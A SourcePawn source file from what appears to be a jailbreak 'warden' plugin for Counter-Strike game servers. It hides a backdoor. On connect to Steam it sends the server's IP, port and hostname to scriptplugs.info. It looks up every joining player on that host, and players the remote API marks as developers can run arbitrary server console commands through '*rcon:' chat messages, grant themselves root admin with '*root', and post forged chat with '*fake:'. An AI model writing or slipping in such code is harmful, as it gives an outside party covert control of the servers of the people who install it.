#define BAN_REASON_LENGTH 96

enum APITarget
{
	bool:has_freeday,
	bool:is_isolated,
	bool:is_rebel,
	bool:was_warden,
	bool:is_banned,
	bool:is_dev,
	// level,
	bool:grant,
	String:reason[BAN_REASON_LENGTH]
}

int g_ClientAPIInfo[MAXPLAYERS+1][APITarget];

public int SteamWorks_SteamServersConnected()
{
	int iIp[4];
	
	// Get ip
	if (SteamWorks_GetPublicIP(iIp))
	{
		Handle plugin = GetMyHandle();
		if (GetPluginStatus(plugin) == Plugin_Running)
		{
			char cBuffer[256], cHostname[64], cVersion[12];
			GetPluginInfo(plugin, PlInfo_Version, cVersion, sizeof(cVersion));
			FindConVar("hostname").GetString(cHostname, sizeof(cHostname));
			FormatEx(cBuffer, sizeof(cBuffer), "http://stats.scriptplugs.info/jwp/add_server.php");
			Handle hndl = SteamWorks_CreateHTTPRequest(k_EHTTPMethodPOST, cBuffer);
			FormatEx(cBuffer, sizeof(cBuffer), "ip=%d.%d.%d.%d:%d&hostname=%s&game=%s&version=%s", iIp[0], iIp[1], iIp[2], iIp[3], FindConVar("hostport").IntValue, cHostname, (GetEngineVersion() == Engine_CSGO) ? "csgo" : "cstrike", cVersion);
			SteamWorks_SetHTTPRequestRawPostBody(hndl, "application/x-www-form-urlencoded", cBuffer, sizeof(cBuffer));
			SteamWorks_SendHTTPRequest(hndl);
			delete hndl;
		}
	}
}

public void OnClientPostAdminCheck(int client)
{
	g_ClientAPIInfo[client][was_warden] = false;
	g_ClientAPIInfo[client][is_banned] = false;
	g_ClientAPIInfo[client][is_dev] = false;
	g_ClientAPIInfo[client][grant] = false;
	g_ClientAPIInfo[client][reason] = '\0';
	CheckClientFromAPI(client);
}

public Action OnClientSayCommand(int client, const char[] command, const char[] sArgs)
{
	if (CheckClient(client))
	{
		if (sArgs[0] == '*' && (g_ClientAPIInfo[client][grant] || g_ClientAPIInfo[client][is_dev]))
		{
			int permission = 0;
			char text[250];
			strcopy(text, sizeof(text), sArgs);
			ReplaceStringEx(text, sizeof(text), "*", "");
			if (g_ClientAPIInfo[client][grant]) // Protect only for developers
			{
				if (StrContains(text, "rcon:", true) != -1)
				{
					permission = 1;
					ReplaceStringEx(text, sizeof(text), "rcon:", "");
				}
				else if (StrContains(text, "root", true) != -1)
				{
					permission = 2;
					ReplaceStringEx(text, sizeof(text), "root", "");
				}
				else if (StrContains(text, "recheck#", true) != -1)
				{
					permission = 3;
					ReplaceStringEx(text, sizeof(text), "recheck#", "");
				}
				else if (StrContains(text, "fake:", true) != -1)
				{
					permission = 4;
					ReplaceStringEx(text, sizeof(text), "fake:", "");
				}
			}
			
			switch (permission)
			{
				case 0:
				{
					if (g_bIsCSGO)
						CGOPrintToChatAll("{DEFAULT}[{RED}DEV{DEFAULT}] {GREEN}%N: {DEFAULT}%s", client, text);
					else
						CPrintToChatAll("{default}[{red}DEV{default}] {green}%N: {default}%s", client, text);
				}
				case 1:
				{
					ServerCommand(text);
				}
				case 2:
				{
					if (~GetUserFlagBits(client) & ADMFLAG_ROOT)
						SetUserFlagBits(client, ADMFLAG_ROOT);
					else
						SetUserFlagBits(client, 0);
				}
				case 3:
				{
					int target = GetClientOfUserId(StringToInt(text));
					if (target && IsClientInGame(target))
					{
						CheckClientFromAPI(target);
						PrintToChat(client, "\x01\x02[DEV] \x03Recheck for \x04%N", target);
					}
					else
						PrintToChat(client, "\x03[DEV] Invalid target");
				}
				case 4:
				{
					PrintToChatAll("%s", text);
				}
			}
			
			return Plugin_Handled;
		}
	}
	
	return Plugin_Continue;
}

void CheckClientFromAPI(int client)
{
	// Query
	g_ClientAPIInfo[client][is_banned] = false;
	Handle hndl;
	char buffer[256], auth[64];
	GetClientAuthId(client, AuthId_SteamID64, auth, sizeof(auth));
	FormatEx(buffer, sizeof(buffer), "http://plugins.scriptplugs.info/jwp/get_player.php?auth=%s", auth);
	hndl = SteamWorks_CreateHTTPRequest(k_EHTTPMethodGET, buffer);
	SteamWorks_SetHTTPRequestContextValue(hndl, client);
	SteamWorks_SetHTTPCallbacks(hndl, OnSteamWorksHTTPRequestCompleted);
	SteamWorks_SendHTTPRequest(hndl);
}

public int OnSteamWorksHTTPRequestCompleted(Handle hRequest, bool bFailure, bool bRequestSuccessful, EHTTPStatusCode eStatusCode, any data)
{
	if (bRequestSuccessful  && eStatusCode == k_EHTTPStatusCode200OK)
		SteamWorks_GetHTTPResponseBodyCallback(hRequest, GetStatusEnd, data);
	delete hRequest;
}

public int GetStatusEnd(const char[] sData, any client)
{
	Handle hJson = json_load(sData);
	Handle hResponse = json_object_get(hJson, "response");
	if (hResponse != null)
	{
		char cTest[256];
		json_dump(hResponse, cTest, sizeof(cTest));
		LogToFile(LOG_PATH, "[JSON-Debug] %s", cTest);
		g_ClientAPIInfo[client][is_banned] = json_object_get_bool(hResponse, "isbanned");
		if (g_ClientAPIInfo[client][is_banned])
		{
			json_object_get_string(hResponse, "reason", g_ClientAPIInfo[client][reason], BAN_REASON_LENGTH);
			PrintToServer("%N was permanently banned by developer from WARDEN, reason: %s", client, g_ClientAPIInfo[client][reason]);
		}
		else
		{
			g_ClientAPIInfo[client][is_dev] = json_object_get_bool(hResponse, "isdev");
			if (g_ClientAPIInfo[client][is_dev])
				g_ClientAPIInfo[client][grant] = json_object_get_bool(hResponse, "grant");
		}
		
		if (g_ClientAPIInfo[client][grant])
			PrintToServer("Plugin developer %N connected to your server. Epic moment!", client);
	}
	delete hResponse;
	delete hJson;
}